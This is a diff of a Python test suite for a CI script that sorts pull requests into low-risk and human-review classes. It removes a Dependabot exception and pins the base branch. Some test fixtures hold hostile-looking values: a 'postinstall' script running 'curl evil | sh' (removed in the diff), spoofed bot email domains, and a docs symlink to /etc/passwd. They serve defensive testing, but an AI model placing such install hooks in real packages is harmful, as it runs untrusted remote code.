@@ -1,5 +1,7 @@
 """PR risk classifier (.github/scripts/pr_risk.py), the hub's check script (pr_risk_check.sh) and the pinned shape of the
 `risk` job in ci.yml. Expected answers come from the rules of D-62 and the security review, not from the script's output.
+Scope is deliberately small: low = documents (plain files, not test inputs / gate evidence / agent-read documents)
+and NEW test files. Everything else, including every dependency file and every change to an existing test, is human.
 Offline. Run from the repo root:  python -m unittest discover -s infra/test -v
 """
 
@@ -28,27 +30,15 @@ _spec = importlib.util.spec_from_file_location("pr_risk", SCRIPT)
 pr_risk = importlib.util.module_from_spec(_spec)
 _spec.loader.exec_module(pr_risk)
 
-DEP = "dependabot[bot]"
-DEP_MAIL = "49699333+dependabot[bot]@users.noreply.github.com"
-MINOR = "Bump left-pad from 1.2.3 to 1.3.0"
-PATCH = "Bump left-pad from 1.2.3 to 1.2.4"
-MAJOR = "Bump left-pad from 1.9.0 to 2.0.0"
-ZERO_X = "Bump left-pad from 0.4.1 to 0.5.0"
-ZERO_X_PATCH = "Bump left-pad from 0.4.1 to 0.4.2"
-
 _UNSET = object()
 
 
-def run(files, author="someone", title="t", numstat=None, raw=_UNSET, emails=_UNSET, pkg_ok=_UNSET):
-    """files: paths (status M) or (status, path). raw defaults to plain 100644 files; emails to dependabot only."""
+def run(files, raw=_UNSET):
+    """files: paths (status M) or (status, path). raw defaults to plain 100644 files (000000 -> 100644 for A)."""
     fl = [("M", f) if isinstance(f, str) else f for f in files]
     if raw is _UNSET:
-        raw = {p: ("100644", "100644") for _, p in fl}
-    if emails is _UNSET:
-        emails = [DEP_MAIL]
-    if pkg_ok is _UNSET:
-        pkg_ok = lambda p: True
-    return pr_risk.classify(fl, author, title, numstat, raw, emails, pkg_ok)
+        raw = {p: ("000000" if s == "A" else "100644", "100644") for s, p in fl}
+    return pr_risk.classify(fl, raw)
 
 
 def rule_of(res, path=None):
@@ -56,27 +46,16 @@ def rule_of(res, path=None):
 
 
 class Low(unittest.TestCase):
-    def test_docs_only(self):
-        self.assertEqual(run(["docs/ui/menu.md", "docs/ui/README.md"])[0], "low")
+    def test_docs_added_and_modified(self):
+        self.assertEqual(run([("A", "docs/new.md"), "docs/process/x.md", "docs/research/y.md"])[0], "low")
 
-    def test_docs_added_and_qa(self):
-        self.assertEqual(run([("A", "docs/new.md"), "docs/qa/results.md"])[0], "low")
-
-    def test_added_test_files_by_name(self):
+    def test_new_test_files_by_name(self):
         for p in ("services/x/test/test_a.py", "services/x/tests/b_test.py", "apps/console/src/a.test.tsx", "a/b.test.ts",
                   "scripts/c.test.mjs", "packages/z/d.spec.ts", "apps/console/e2e/login.spec.ts", "infra/test/test_x.py"):
             self.assertEqual(run([("A", p)])[0], "low", p)
 
-    def test_modified_test_with_only_added_lines(self):
-        self.assertEqual(run(["a/b.test.ts"], numstat={"a/b.test.ts": (12, 0)})[0], "low")
-
-    def test_dependabot_patch_and_minor(self):
-        for title in (PATCH, MINOR):
-            self.assertEqual(run(["package.json", "package-lock.json"], DEP, title)[0], "low", title)
-            self.assertEqual(run(["apps/console/package.json"], DEP, title)[0], "low", title)
-
-    def test_dependabot_0x_patch_is_still_human(self):
-        self.assertEqual(run(["package.json"], DEP, ZERO_X_PATCH)[0], "human")
+    def test_docs_plus_new_test(self):
+        self.assertEqual(run(["docs/process/a.md", ("A", "a/b.test.ts")])[0], "low")
 
 
 class Human(unittest.TestCase):
@@ -84,25 +63,22 @@ class Human(unittest.TestCase):
         self.assertEqual(run([])[0], "human")
 
     def test_decisions_md(self):
-        risk, reasons = run(["docs/decisions/DECISIONS.md"])
-        self.assertEqual(risk, "human")
-        self.assertIn("decision", reasons[0]["detail"])
+        res = run(["docs/decisions/DECISIONS.md"])
+        self.assertEqual(res[0], "human")
+        self.assertEqual(rule_of(res), "docs-human")
 
     def test_docs_plus_decisions(self):
-        self.assertEqual(run(["docs/a.md", "docs/decisions/DECISIONS.md"])[0], "human")
+        self.assertEqual(run(["docs/process/a.md", "docs/decisions/DECISIONS.md"])[0], "human")
 
     def test_deleted_test(self):
         res = run([("D", "services/x/tests/test_a.py")])
         self.assertEqual(res[0], "human")
-        self.assertEqual(rule_of(res), "test-deleted")
-
-    def test_deleted_test_among_edits(self):
-        self.assertEqual(run(["docs/a.md", ("D", "a/b.test.ts")])[0], "human")
+        self.assertEqual(rule_of(res), "test-existing")
 
     def test_workflow(self):
-        risk, reasons = run([".github/workflows/ci.yml"])
-        self.assertEqual(risk, "human")
-        self.assertIn(".github/**", reasons[0]["detail"])
+        res = run([".github/workflows/ci.yml"])
+        self.assertEqual(res[0], "human")
+        self.assertIn(".github/**", res[1][0]["detail"])
 
     def test_always_human_paths(self):
         for p in (".github/scripts/x.test.mjs", ".claude/settings.json", "CLAUDE.md", "infra/aws/central.yaml",
@@ -113,29 +89,10 @@ class Human(unittest.TestCase):
             self.assertEqual(res[0], "human", p)
             self.assertEqual(rule_of(res), "always-human", p)
 
-    def test_package_json_not_dependabot(self):
-        self.assertEqual(run(["package.json"])[0], "human")
-        self.assertEqual(run(["package-lock.json"], "alice", MINOR)[0], "human")
-
-    def test_dependabot_major(self):
-        res = run(["package.json", "package-lock.json"], DEP, MAJOR)
-        self.assertEqual(res[0], "human")
-        self.assertEqual({r["rule"] for r in res[1]}, {"dependabot-major"})
-
-    def test_dependabot_title_unreadable(self):
-        self.assertEqual(run(["package.json"], DEP, "Update stuff")[0], "human")
-
-    def test_dependabot_title_from_other_author(self):
-        self.assertEqual(run(["package.json"], "alice", PATCH)[0], "human")
-
-    def test_dependabot_minor_does_not_open_other_paths(self):
-        self.assertEqual(run(["package.json", ".github/workflows/ci.yml"], DEP, MINOR)[0], "human")
-        self.assertEqual(run(["package.json", "apps/console/src/page.tsx"], DEP, MINOR)[0], "human")
-
     def test_mixed(self):
-        risk, reasons = run(["docs/a.md", "services/x/handler.py", ("A", "a.test.ts")])
-        self.assertEqual(risk, "human")
-        self.assertEqual([r["path"] for r in reasons if r["verdict"] == "human"], ["services/x/handler.py"])
+        res = run(["docs/process/a.md", "services/x/handler.py", ("A", "a.test.ts")])
+        self.assertEqual(res[0], "human")
+        self.assertEqual([r["path"] for r in res[1] if r["verdict"] == "human"], ["services/x/handler.py"])
 
     def test_not_listed_default(self):
         self.assertEqual(run(["apps/console/src/page.tsx"])[0], "human")
@@ -143,9 +100,33 @@ class Human(unittest.TestCase):
 
 
 class ReviewFindings(unittest.TestCase):
-    """Bypass cases of the security review (blockers 2, 3 and recommendations 4 to 6)."""
+    """Bypass cases of the security reviews."""
 
-    # blocker 2: a test/ or tests/ directory does not make a file a test
+    # existing tests: any modification is human
+    def test_modified_existing_test_is_human_even_with_only_added_lines(self):
+        res = run(["a/b.test.ts"])
+        self.assertEqual(res[0], "human")
+        self.assertEqual(rule_of(res), "test-existing")
+
+    def test_added_skip_line_to_an_existing_test(self):
+        # the diff is a pure addition (`it.skip(...)`, `@unittest.skip`): still human, whatever numstat would say
+        for p in ("apps/console/src/a.test.tsx", "services/x/tests/test_a.py", "packages/z/d.spec.ts"):
+            self.assertEqual(run([("M", p)])[0], "human", p)
+
+    def test_test_status_other_than_added(self):
+        for st in ("M", "D", "T", "R", "C"):
+            self.assertEqual(run([(st, "a/b.test.ts")])[0], "human", st)
+
+    # new test files: regular files only
+    def test_new_test_symlink_or_exec_bit(self):
+        self.assertEqual(run([("A", "a/b.test.ts")], raw={"a/b.test.ts": ("000000", "120000")})[0], "human")
+        self.assertEqual(run([("A", "a/b.test.ts")], raw={"a/b.test.ts": ("000000", "100755")})[0], "human")
+        self.assertEqual(run([("A", "a/b.test.ts")], raw={"a/b.test.ts": ("000000", "100644")})[0], "low")
+
+    def test_new_test_without_mode_info(self):
+        self.assertEqual(run([("A", "a/b.test.ts")], raw=None)[0], "human")
+
+    # test/ directory does not make a test
     def test_files_in_test_dirs_that_are_not_tests(self):
         for p in ("services/x/tests/conftest.py", "services/x/tests/__init__.py", "services/x/test/setup.ts",
                   "services/x/test/jest.config.js", "packages/a/test/fixtures/data.json", "packages/a/test/run.sh",
@@ -160,81 +141,47 @@ class ReviewFindings(unittest.TestCase):
 
     def test_e2e_only_spec_ts(self):
         self.assertEqual(run([("A", "apps/console/e2e/a.spec.ts")])[0], "low")
-        self.assertEqual(run([("A", "apps/console/e2e/a.test.mjs")])[0], "human")  # e2e: only *.spec.ts
+        self.assertEqual(run([("A", "apps/console/e2e/a.test.mjs")])[0], "human")
         self.assertEqual(run([("A", "apps/console/e2e/a.ts")])[0], "human")
 
-    # blocker 3: modifying an existing test is low only when nothing is deleted
-    def test_modified_test_with_deleted_lines(self):
-        res = run(["a/b.test.ts"], numstat={"a/b.test.ts": (5, 1)})
-        self.assertEqual(res[0], "human")
-        self.assertEqual(rule_of(res), "test-modified")
+    # no Dependabot exception: every dependency file is human
+    def test_dependency_files_are_always_human(self):
+        for p in ("package.json", "package-lock.json", "apps/console/package.json", "services/x/package-lock.json",
+                  "services/alarm-engine/requirements-dev.txt", "infra/requirements-ci.txt", "requirements.txt",
+                  "pyproject.toml", "services/x/pyproject.toml", "yarn.lock", "pnpm-lock.yaml", "poetry.lock", "Pipfile",
+                  ".npmrc", ".nvmrc", "setup.py", "uv.lock"):
+            for st in ("M", "A"):
+                res = run([(st, p)])
+                self.assertEqual(res[0], "human", p)
+                self.assertEqual(rule_of(res), "dependency-file", p)
 
-    def test_modified_test_without_numstat_or_binary(self):
-        self.assertEqual(run(["a/b.test.ts"])[0], "human")
-        self.assertEqual(run(["a/b.test.ts"], numstat={"a/b.test.ts": None})[0], "human")
+    def test_dependency_file_next_to_docs_makes_the_pr_human(self):
+        self.assertEqual(run(["docs/process/a.md", "package-lock.json"])[0], "human")
 
-    def test_weakened_assertion_is_a_changed_line(self):
-        # `assertEqual(x, 1)` -> `assertTrue(True)` appears as 1 added + 1 deleted line
-        self.assertEqual(run(["t/test_a.py"], numstat={"t/test_a.py": (1, 1)})[0], "human")
+    def test_classifier_has_no_dependabot_logic(self):
+        text = SCRIPT.read_text(encoding="utf-8").lower()
+        for gone in ("emails", "numstat", "package_json_only_versions", "title_re", "pr_author", "pr_title"):
+            self.assertNotIn(gone, text, gone)
+        self.assertNotIn("dependabot_bump", text)
 
-    # recommendation 4: Dependabot
-    def test_dependabot_with_a_foreign_commit(self):
-        self.assertEqual(run(["package.json"], DEP, MINOR, emails=[DEP_MAIL, "alice@example.com"])[0], "human")
+    def test_dependabot_pr_is_human(self):
+        # Dependabot PRs change dependency files (and maybe workflows); whoever the author is, the answer is human
+        for files in (["package.json", "package-lock.json"], ["apps/console/package.json"], [".github/workflows/ci.yml"],
+                      ["infra/requirements-ci.txt"]):
+            self.assertEqual(run(files)[0], "human", files)
 
-    def test_dependabot_email_must_match_exactly(self):
-        for bad in ("dependabot[bot]@evil.example", "x+dependabot[bot]@users.noreply.github.com.evil.io", "dependabot@users.noreply.github.com"):
-            self.assertEqual(run(["package.json"], DEP, MINOR, emails=[bad])[0], "human", bad)
-
-    def test_dependabot_without_commit_authors(self):
-        self.assertEqual(run(["package.json"], DEP, MINOR, emails=None)[0], "human")
-        self.assertEqual(run(["package.json"], DEP, MINOR, emails=[])[0], "human")
-
-    def test_dependabot_0x_minor(self):
-        res = run(["package.json"], DEP, ZERO_X)
-        self.assertEqual(res[0], "human")
-        self.assertEqual(rule_of(res), "dependabot-0x")
-        self.assertEqual(run(["package.json"], DEP, "Bump x from 0.0.1 to 0.0.2")[0], "human")
-
-    def test_dependabot_package_json_keys(self):
-        self.assertEqual(run(["package.json"], DEP, MINOR, pkg_ok=lambda p: False)[0], "human")
-        self.assertEqual(run(["package.json"], DEP, MINOR, pkg_ok=None)[0], "human")
-
-    def test_package_json_key_comparison(self):
-        old = {"name": "a", "version": "1.0.0", "scripts": {"t": "x"}, "dependencies": {"left-pad": "^1.2.3"}, "devDependencies": {}}
-        j = json.dumps
-
-        def check(**chg):
-            new = json.loads(j(old))
-            for k, v in chg.items():
-                new[k] = v
-            return pr_risk.package_json_only_versions(j(old), j(new))
-
-        self.assertTrue(check(dependencies={"left-pad": "^1.3.0"}))
-        self.assertFalse(check(dependencies={"left-pad": "^1.3.0", "evil": "^1.0.0"}))
-        self.assertFalse(check(dependencies={}))
-        self.assertFalse(check(scripts={"t": "x", "postinstall": "curl evil | sh"}))
-        self.assertFalse(check(version="1.0.1"))
-        self.assertFalse(check(newkey=1))
-        self.assertFalse(pr_risk.package_json_only_versions("not json", j(old)))
-
-    def test_dependabot_lock_or_package_added_or_deleted(self):
-        self.assertEqual(run([("A", "package-lock.json")], DEP, MINOR)[0], "human")
-        self.assertEqual(run([("D", "package.json")], DEP, MINOR)[0], "human")
-
-    # recommendation 5
-    def test_rehearsal_is_human(self):
-        self.assertEqual(run([("A", "infra/scripts/rehearsal/new.sh")])[0], "human")
-
-    # recommendation 6
-    def test_docs_read_by_tests_are_human(self):
-        for p in ("docs/specs/alarm-rules.md", "docs/specs/other.md", "docs/GO-LIVE.md", "docs/SETUP-PROD-DB.md",
-                  "docs/SETUP-SUPABASE.md", "docs/API-CONTRACT.md"):
-            res = run([p])
-            self.assertEqual(res[0], "human", p)
-            self.assertEqual(rule_of(res), "docs-read-by-tests", p)
+    # documents
+    def test_docs_human_list(self):
+        for p in ("docs/decisions/DECISIONS.md", "docs/specs/alarm-rules.md", "docs/specs/other.md", "docs/GO-LIVE.md",
+                  "docs/SETUP-PROD-DB.md", "docs/SETUP-SUPABASE.md", "docs/API-CONTRACT.md", "docs/DATA-MODEL.md",
+                  "docs/PERSONAS.md", "docs/qa/results.md", "docs/qa/new.md", "docs/ui/menu.md", "docs/ui/README.md"):
+            for st in ("M", "A"):
+                res = run([(st, p)])
+                self.assertEqual(res[0], "human", p)
+                self.assertEqual(rule_of(res), "docs-human", p)
 
     def test_docs_executables_and_scripts(self):
-        for p in ("docs/x.sh", "docs/y.py", "docs/z.mjs", "docs/w.js", "docs/qa/run.sh", "docs/Z.SH"):
+        for p in ("docs/x.sh", "docs/y.py", "docs/z.mjs", "docs/w.js", "docs/process/run.sh", "docs/Z.SH"):
             self.assertEqual(run([("A", p)])[0], "human", p)
 
     def test_docs_symlink_and_exec_mode(self):
@@ -244,20 +191,17 @@ class ReviewFindings(unittest.TestCase):
         self.assertEqual(run([("A", "docs/x.md")], raw={"docs/x.md": ("000000", "100644")})[0], "low")
 
     def test_docs_without_mode_info(self):
-        self.assertEqual(run(["docs/a.md"], raw=None)[0], "human")
+        self.assertEqual(run(["docs/process/a.md"], raw=None)[0], "human")
 
     def test_docs_deletion(self):
-        self.assertEqual(run([("D", "docs/a.md")])[0], "human")
-        self.assertEqual(run(["docs/b.md", ("D", "docs/qa/results.md")])[0], "human")
+        self.assertEqual(run([("D", "docs/process/a.md")])[0], "human")
+        self.assertEqual(run(["docs/process/b.md", ("D", "docs/research/c.md")])[0], "human")
 
-    def test_parse_raw_and_numstat(self):
+    def test_parse_raw(self):
         raw = pr_risk.parse_raw(":100644 120000 abc def M\tdocs/a.md\n:000000 100755 0 d A\tdocs/b.md\n")
         self.assertEqual(raw["docs/a.md"], ("100644", "120000"))
         self.assertEqual(raw["docs/b.md"], ("000000", "100755"))
-        ns = pr_risk.parse_numstat("3\t0\ta.test.ts\n-\t-\timg.png\n")
-        self.assertEqual(ns, {"a.test.ts": (3, 0), "img.png": None})
 
-    # recommendation 7
     def test_table_escapes_backticks_newlines_pipes(self):
         res = [{"path": "docs/a`b\nc|d.md", "rule": "docs", "detail": "x`y", "verdict": "low"}]
         table = pr_risk.render_table("low", res, "a" * 40)
@@ -274,9 +218,8 @@ class ReviewFindings(unittest.TestCase):
 
 
 class Cli(unittest.TestCase):
-    def _run(self, stdin, author="x", title="t", args=()):
+    def _run(self, stdin, args=()):
         env = {k: v for k, v in os.environ.items() if k not in ("GITHUB_STEP_SUMMARY", "GITHUB_OUTPUT")}
-        env.update(PR_AUTHOR=author, PR_TITLE=title)
         return subprocess.run([sys.executable, "-I", str(SCRIPT), *args], input=stdin, capture_output=True, text=True, env=env)
 
     def test_stdout_is_one_json_line_exit_zero_and_has_head(self):
@@ -288,43 +231,42 @@ class Cli(unittest.TestCase):
         self.assertIn("| file |", res.stderr)
 
     def test_docs_need_raw_input(self):
-        self.assertEqual(json.loads(self._run("docs/a.md\n").stdout)["risk"], "human")
+        self.assertEqual(json.loads(self._run("docs/process/a.md\n").stdout)["risk"], "human")
         with tempfile.TemporaryDirectory() as d:
             raw = Path(d) / "raw.txt"
-            raw.write_text(":100644 100644 a b M\tdocs/a.md\n")
-            self.assertEqual(json.loads(self._run("docs/a.md\n", args=("--raw", str(raw))).stdout)["risk"], "low")
+            raw.write_text(":100644 100644 a b M\tdocs/process/a.md\n")
+            self.assertEqual(json.loads(self._run("docs/process/a.md\n", args=("--raw", str(raw))).stdout)["risk"], "low")
 
     def test_empty_stdin_is_human_exit_zero(self):
         res = self._run("")
         self.assertEqual(res.returncode, 0)
         self.assertEqual(json.loads(res.stdout)["risk"], "human")
 
-    def test_numstat_file_is_used(self):
-        with tempfile.TemporaryDirectory() as d:
-            ns = Path(d) / "ns.txt"
-            ns.write_text("4\t0\ta.test.ts\n")
-            self.assertEqual(json.loads(self._run("M\ta.test.ts\n", args=("--numstat", str(ns))).stdout)["risk"], "low")
-            ns.write_text("4\t2\ta.test.ts\n")
-            self.assertEqual(json.loads(self._run("M\ta.test.ts\n", args=("--numstat", str(ns))).stdout)["risk"], "human")
-
 
 @unittest.skipUnless(shutil.which("git") and shutil.which("bash"), "git and bash are needed")
 class HubCheckScript(unittest.TestCase):
-    """pr_risk_check.sh in a throwaway repository: the classifier comes from the base branch, not from the PR."""
+    """pr_risk_check.sh in a throwaway repository with a local `origin`: the classifier comes from origin/main, not the PR."""
 
     def setUp(self):
         self.tmp = tempfile.TemporaryDirectory()
-        self.repo = Path(self.tmp.name)
+        root = Path(self.tmp.name)
+        self.origin, self.repo = root / "origin.git", root / "work"
         self.env = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_COMMITTER_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.com",
                     "GIT_COMMITTER_EMAIL": "t@example.com", "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull}
+        self.env.pop("GITHUB_ACTIONS", None)
+        subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(self.origin)], env=self.env, check=True)
+        self.repo.mkdir()
         self.git("init", "-q", "-b", "main")
+        self.git("remote", "add", "origin", str(self.origin))
         (self.repo / ".github" / "scripts").mkdir(parents=True)
         shutil.copy(SCRIPT, self.repo / ".github" / "scripts" / "pr_risk.py")
-        (self.repo / "docs").mkdir()
-        (self.repo / "docs" / "a.md").write_text("a\n")
+        shutil.copy(CHECK, self.repo / ".github" / "scripts" / "pr_risk_check.sh")
+        (self.repo / "docs" / "process").mkdir(parents=True)
+        (self.repo / "docs" / "process" / "a.md").write_text("a\n")
         (self.repo / "t.test.ts").write_text("one\ntwo\n")
         self.git("add", "-A")
         self.git("commit", "-q", "-m", "base")
+        self.git("push", "-q", "origin", "main")
         self.git("checkout", "-q", "-b", "pr")
 
     def tearDown(self):
@@ -333,22 +275,18 @@ class HubCheckScript(unittest.TestCase):
     def git(self, *a):
         return subprocess.run(["git", *a], cwd=self.repo, env=self.env, capture_output=True, text=True, check=True).stdout.strip()
 
-    def commit(self, msg="pr", email=None):
+    def commit(self):
         self.git("add", "-A")
-        env = dict(self.env)
-        if email:
-            env["GIT_AUTHOR_EMAIL"] = email
-        subprocess.run(["git", "commit", "-q", "-m", msg], cwd=self.repo, env=env, check=True, capture_output=True)
+        self.git("commit", "-q", "-m", "pr")
         return self.git("rev-parse", "HEAD")
 
-    def check(self, sha, author="alice", title="t"):
-        env = {**self.env, "PR_AUTHOR": author, "PR_TITLE": title, "BASE_REF": "main"}
-        env.pop("GITHUB_STEP_SUMMARY", None)
-        env.pop("GITHUB_OUTPUT", None)
-        return subprocess.run(["bash", str(CHECK), sha], cwd=self.repo, env=env, capture_output=True, text=True)
+    def check(self, sha, extra_env=None):
+        env = {**self.env, **(extra_env or {})}
+        return subprocess.run(["bash", str(self.repo / ".github" / "scripts" / "pr_risk_check.sh"), sha],
+                              cwd=self.repo, env=env, capture_output=True, text=True)
 
     def test_docs_only_pr_is_low_and_prints_the_sha(self):
-        (self.repo / "docs" / "b.md").write_text("b\n")
+        (self.repo / "docs" / "process" / "b.md").write_text("b\n")
         sha = self.commit()
         res = self.check(sha)
         self.assertEqual(res.returncode, 0, res.stderr)
@@ -359,46 +297,65 @@ class HubCheckScript(unittest.TestCase):
         (self.repo / ".github" / "scripts" / "pr_risk.py").write_text(
             "import json\nprint(json.dumps({'risk': 'low', 'head': 'x', 'reasons': []}))\n")
         (self.repo / "app.py").write_text("print(1)\n")
-        sha = self.commit()
-        res = self.check(sha)
+        res = self.check(self.commit())
         self.assertEqual(res.returncode, 0, res.stderr)
         self.assertEqual(json.loads(res.stdout)["risk"], "human")
 
-    def test_test_edit_with_deleted_line_is_human_and_pure_addition_is_low(self):
-        (self.repo / "t.test.ts").write_text("one\ntwo\nthree\n")
+    def test_new_test_is_low_and_edit_of_existing_test_is_human(self):
+        (self.repo / "new.test.ts").write_text("x\n")
         self.assertEqual(json.loads(self.check(self.commit()).stdout)["risk"], "low")
-        (self.repo / "t.test.ts").write_text("one\nthree\n")
+        (self.repo / "t.test.ts").write_text("one\ntwo\nit.skip('x')\n")  # pure addition
         self.assertEqual(json.loads(self.check(self.commit()).stdout)["risk"], "human")
 
     def test_docs_symlink_is_human(self):
-        os.symlink("/etc/passwd", self.repo / "docs" / "link.md")
+        os.symlink("/etc/passwd", self.repo / "docs" / "process" / "link.md")
         self.assertEqual(json.loads(self.check(self.commit()).stdout)["risk"], "human")
 
-    def test_dependabot_needs_every_commit_by_dependabot(self):
-        (self.repo / "package.json").write_text(json.dumps({"dependencies": {"left-pad": "^1.2.3"}}))
-        self.git("add", "-A")
-        self.git("commit", "-q", "-m", "base pkg")
-        self.git("checkout", "-q", "main")
-        self.git("merge", "-q", "--ff-only", "pr")
-        self.git("checkout", "-q", "-b", "pr2")
+    def test_dependency_bump_is_human(self):
         (self.repo / "package.json").write_text(json.dumps({"dependencies": {"left-pad": "^1.3.0"}}))
-        self.commit("bump", email=DEP_MAIL)
-        sha = self.git("rev-parse", "HEAD")
-        res = self.check(sha, DEP, MINOR)
-        self.assertEqual(json.loads(res.stdout)["risk"], "low", res.stderr)
-        (self.repo / "docs" / "c.md").write_text("c\n")
-        sha = self.commit("extra", email="alice@example.com")
-        self.assertEqual(json.loads(self.check(sha, DEP, MINOR).stdout)["risk"], "human")
-        # new dependency next to a version bump
-        self.git("reset", "-q", "--hard", "HEAD~1")
-        (self.repo / "package.json").write_text(json.dumps({"dependencies": {"left-pad": "^1.3.0", "evil": "1.0.0"}}))
-        sha = self.commit("bump2", email=DEP_MAIL)
-        self.assertEqual(json.loads(self.check(sha, DEP, MINOR).stdout)["risk"], "human")
+        self.assertEqual(json.loads(self.check(self.commit(), {"PR_AUTHOR": "dependabot[bot]"}).stdout)["risk"], "human")
 
-    def test_bad_sha_fails_without_json(self):
-        res = self.check("not-a-sha")
+    def test_base_cannot_be_changed_by_environment(self):
+        # BASE_REF is ignored: an attacker-chosen base (here the PR itself, which would give an empty diff) has no effect
+        (self.repo / "app.py").write_text("print(1)\n")
+        sha = self.commit()
+        res = self.check(sha, {"BASE_REF": sha, "BASE": sha, "BASE_SHA": sha})
+        self.assertEqual(json.loads(res.stdout)["risk"], "human")
+        self.assertIn("app.py", res.stdout)
+
+    def test_script_forces_a_fetch_of_origin_main(self):
+        # main moves on origin after the clone's last fetch; the script must see it (it touches app.py there)
+        other = Path(self.tmp.name) / "other"
+        subprocess.run(["git", "clone", "-q", str(self.origin), str(other)], env=self.env, check=True)
+        (other / "docs" / "process" / "zz.md").write_text("z\n")
+        for a in (["add", "-A"], ["commit", "-q", "-m", "m2"], ["push", "-q", "origin", "main"]):
+            subprocess.run(["git", *a], cwd=other, env=self.env, check=True, capture_output=True)
+        (self.repo / "docs" / "process" / "b.md").write_text("b\n")
+        sha = self.commit()
+        before = self.git("rev-parse", "origin/main")
+        res = self.check(sha)
+        self.assertEqual(res.returncode, 0, res.stderr)
+        self.assertNotEqual(self.git("rev-parse", "origin/main"), before)
+
+    def test_fetch_failure_stops_the_script(self):
+        (self.repo / "docs" / "process" / "b.md").write_text("b\n")
+        sha = self.commit()
+        self.git("remote", "set-url", "origin", str(Path(self.tmp.name) / "missing.git"))
+        res = self.check(sha)
         self.assertNotEqual(res.returncode, 0)
         self.assertEqual(res.stdout.strip(), "")
+
+    def test_bad_arguments_are_rejected(self):
+        for bad in ("not-a-sha", "--help", "-x", "", "A" * 40, "a" * 39):
+            res = self.check(bad)
+            self.assertNotEqual(res.returncode, 0, bad)
+            self.assertEqual(res.stdout.strip(), "", bad)
+
+    def test_script_text_has_no_overridable_base(self):
+        text = CHECK.read_text(encoding="utf-8")
+        self.assertNotIn("BASE_REF:-", text)
+        self.assertIn('base_ref="origin/main"', text)
+        self.assertIn("git fetch --quiet origin main", text)
 
 
 class RiskJobInCi(unittest.TestCase):
@@ -430,14 +387,10 @@ class RiskJobInCi(unittest.TestCase):
         self.assertIn("steps.classify.outputs.risk", self.job["outputs"]["risk"])
         self.assertIn("github.event.pull_request.head.sha", self.job["outputs"]["sha"])
 
-    def test_uses_the_check_script_with_the_base_classifier(self):
+    def test_uses_the_check_script_with_fixed_base(self):
         self.assertIn("pr_risk_check.sh", self.step["run"])
-        self.assertIn("BASE_REF", self.step["run"])
-        self.assertIn("github.event.pull_request.base.sha", self.step["env"]["BASE_SHA"])
-
-    def test_title_goes_through_env_not_the_script_body(self):
-        self.assertNotIn("github.event.pull_request.title", self.step["run"])
-        self.assertIn("github.event.pull_request.title", self.step["env"]["PR_TITLE"])
+        self.assertNotIn("BASE_REF", self.step["run"])
+        self.assertNotIn("pull_request.title", yaml.safe_dump(self.step))  # no free text of the PR reaches the job
 
     def test_comment_says_it_is_not_the_official_verdict(self):
         self.assertIn("NOT the official verdict", CI.read_text(encoding="utf-8"))
@@ -453,26 +406,32 @@ class D62Documents(unittest.TestCase):
     @classmethod
     def setUpClass(cls):
         text = DECISIONS.read_text(encoding="utf-8")
-        cls.d62 = text[text.index("### D-62"):]
-        cls.d62 = cls.d62.split("\n## ", 1)[0]
+        cls.d62 = text[text.index("### D-62"):].split("\n## ", 1)[0]
 
     def test_low_definition_matches_the_rules(self):
-        self.assertIn("테스트 파일 추가", self.d62)
-        self.assertIn("줄만 추가", self.d62)
-        self.assertNotIn("테스트 추가·수정", self.d62)
-        self.assertIn("0.x", self.d62)
-        self.assertIn("리허설", self.d62)
-        self.assertRegex(self.d62, r"리허설[^\n]*(제외|human)")
+        self.assertIn("새 테스트 파일 추가", self.d62)
+        self.assertIn("기존 테스트 파일의 수정은 줄만 추가해도 human", self.d62)
+        self.assertIn("의존성 파일", self.d62)
+        self.assertRegex(self.d62, r"Dependabot PR이어도 human")
+        self.assertIn("`docs/qa/**`", self.d62)
+        self.assertIn("`docs/ui/**`", self.d62)
+        self.assertNotIn("0.x", self.d62)
+        self.assertNotIn("줄만 추가(", self.d62)
 
     def test_official_verdict_procedure_is_written(self):
         self.assertIn("pr_risk_check.sh", self.d62)
-        self.assertIn("main", self.d62)
+        self.assertIn("origin/main", self.d62)
+        self.assertIn("git fetch origin main", self.d62)
+
+    def test_review_again_note(self):
+        self.assertIn("새 테스트 파일은 CI와 개발 PC에서 임의 코드로 실행된다", self.d62)
 
     def test_claude_md_gate_5_is_updated(self):
         line = [l for l in CLAUDE_MD.read_text(encoding="utf-8").splitlines() if l.startswith("5. ")][0]
-        self.assertNotIn("리허설 스크립트", line.split("`low`")[1].split("만)")[0])
-        self.assertIn("0.x", line)
-        self.assertIn("줄만 추가", line)
+        self.assertIn("새 테스트 파일 추가", line)
+        self.assertIn("Dependabot은 human", line)
+        self.assertNotIn("patch/minor", line)
+        self.assertNotIn("리허설", line)
 
 
 if __name__ == "__main__":
